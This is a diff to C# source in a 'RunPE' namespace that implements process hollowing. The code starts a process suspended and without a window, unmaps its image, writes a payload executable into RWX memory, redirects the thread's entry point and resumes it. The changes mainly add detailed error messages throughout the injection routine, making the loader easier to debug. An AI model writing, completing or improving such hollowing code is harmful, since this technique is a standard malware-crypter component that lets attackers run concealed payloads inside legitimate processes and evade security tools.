@@ -140,59 +140,107 @@ namespace RunPE
                 StartupInformation si = new StartupInformation();
                 ProcessInformation pi = new ProcessInformation();
                 si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
+
                 try
                 {
-                    if (!CreateProcessA(path, string.Empty, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, ref pi)) throw new Exception($"CreateProcessA failed. LastError={Marshal.GetLastWin32Error()}");
+                    if (!CreateProcessA(path, string.Empty, IntPtr.Zero, IntPtr.Zero, false,
+                        0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, ref pi))
+                        throw new Exception($"CreateProcessA failed. LastError={Marshal.GetLastWin32Error()}");
+
                     int fileAddress = BitConverter.ToInt32(payload, 0x3C);
                     int imageBase = BitConverter.ToInt32(payload, fileAddress + 0x34);
+
                     int[] context = new int[0xB3];
                     context[0x0] = 0x10002;
+
                     if (IntPtr.Size == 0x4)
-                    { if (!GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
+                    {
+                        if (!GetThreadContext(pi.ThreadHandle, context))
+                            throw new Exception($"GetThreadContext failed. LastError={Marshal.GetLastWin32Error()}");
+                    }
                     else
-                    { if (!Wow64GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
+                    {
+                        if (!Wow64GetThreadContext(pi.ThreadHandle, context))
+                            throw new Exception($"Wow64GetThreadContext failed. LastError={Marshal.GetLastWin32Error()}");
+                    }
+
                     int ebx = context[0x29];
                     int baseAddress = 0x0;
-                    if (!ReadProcessMemory(pi.ProcessHandle, ebx + 0x8, ref baseAddress, 0x4, ref readWrite)) throw new Exception();
+
+                    if (!ReadProcessMemory(pi.ProcessHandle, ebx + 0x8, ref baseAddress, 0x4, ref readWrite))
+                        throw new Exception($"ReadProcessMemory PEB image base failed. LastError={Marshal.GetLastWin32Error()} EBX=0x{ebx:X}");
+
                     if (imageBase == baseAddress)
-                        if (ZwUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 0x0) throw new Exception();
+                    {
+                        if (ZwUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 0x0)
+                            throw new Exception($"ZwUnmapViewOfSection failed. LastError={Marshal.GetLastWin32Error()} baseAddress=0x{baseAddress:X}");
+                    }
+
                     int sizeOfImage = BitConverter.ToInt32(payload, fileAddress + 0x50);
                     int sizeOfHeaders = BitConverter.ToInt32(payload, fileAddress + 0x54);
-                    bool allowOverride = false;
-                    int newImageBase = VirtualAllocEx(pi.ProcessHandle, imageBase, sizeOfImage, 0x3000, 0x40);
 
-                    if (newImageBase == 0x0) throw new Exception();
-                    if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, payload, sizeOfHeaders, ref readWrite)) throw new Exception();
+                    bool allowOverride = false;
+
+                    int newImageBase = VirtualAllocEx(
+                        pi.ProcessHandle,
+                        imageBase,
+                        sizeOfImage,
+                        0x3000,
+                        0x40
+                    );
+
+                    if (newImageBase == 0x0)
+                        throw new Exception($"VirtualAllocEx failed. LastError={Marshal.GetLastWin32Error()} imageBase=0x{imageBase:X} sizeOfImage=0x{sizeOfImage:X}");
+
+                    if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, payload, sizeOfHeaders, ref readWrite))
+                        throw new Exception($"WriteProcessMemory headers failed. LastError={Marshal.GetLastWin32Error()}");
+
                     int sectionOffset = fileAddress + 0xF8;
                     short numberOfSections = BitConverter.ToInt16(payload, fileAddress + 0x6);
+
                     for (int I = 0; I < numberOfSections; I++)
                     {
                         int virtualAddress = BitConverter.ToInt32(payload, sectionOffset + 0xC);
                         int sizeOfRawData = BitConverter.ToInt32(payload, sectionOffset + 0x10);
                         int pointerToRawData = BitConverter.ToInt32(payload, sectionOffset + 0x14);
+
                         if (sizeOfRawData != 0x0)
                         {
                             byte[] sectionData = new byte[sizeOfRawData];
                             Buffer.BlockCopy(payload, pointerToRawData, sectionData, 0x0, sectionData.Length);
-                            if (!WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite)) throw new Exception();
+
+                            if (!WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite))
+                                throw new Exception($"WriteProcessMemory section failed. LastError={Marshal.GetLastWin32Error()} section={I} VA=0x{virtualAddress:X} size=0x{sizeOfRawData:X}");
                         }
+
                         sectionOffset += 0x28;
                     }
+
                     byte[] pointerData = BitConverter.GetBytes(newImageBase);
-                    if (!WriteProcessMemory(pi.ProcessHandle, ebx + 0x8, pointerData, 0x4, ref readWrite)) throw new Exception();
+
+                    if (!WriteProcessMemory(pi.ProcessHandle, ebx + 0x8, pointerData, 0x4, ref readWrite))
+                        throw new Exception($"WriteProcessMemory PEB image base update failed. LastError={Marshal.GetLastWin32Error()} EBX=0x{ebx:X}");
+
                     int addressOfEntryPoint = BitConverter.ToInt32(payload, fileAddress + 0x28);
-                    if (allowOverride) newImageBase = imageBase;
+
+                    if (allowOverride)
+                        newImageBase = imageBase;
+
                     context[0x2C] = newImageBase + addressOfEntryPoint;
 
                     if (IntPtr.Size == 0x4)
                     {
-                        if (!SetThreadContext(pi.ThreadHandle, context)) throw new Exception();
+                        if (!SetThreadContext(pi.ThreadHandle, context))
+                            throw new Exception($"SetThreadContext failed. LastError={Marshal.GetLastWin32Error()}");
                     }
                     else
                     {
-                        if (!Wow64SetThreadContext(pi.ThreadHandle, context)) throw new Exception();
+                        if (!Wow64SetThreadContext(pi.ThreadHandle, context))
+                            throw new Exception($"Wow64SetThreadContext failed. LastError={Marshal.GetLastWin32Error()}");
                     }
-                    if (ResumeThread(pi.ThreadHandle) == -1) throw new Exception();
+
+                    if (ResumeThread(pi.ThreadHandle) == -1)
+                        throw new Exception($"ResumeThread failed. LastError={Marshal.GetLastWin32Error()}");
                 }
                 catch (Exception ex)
                 {
@@ -210,6 +258,7 @@ namespace RunPE
 
                     continue;
                 }
+
                 break;
             }
         }
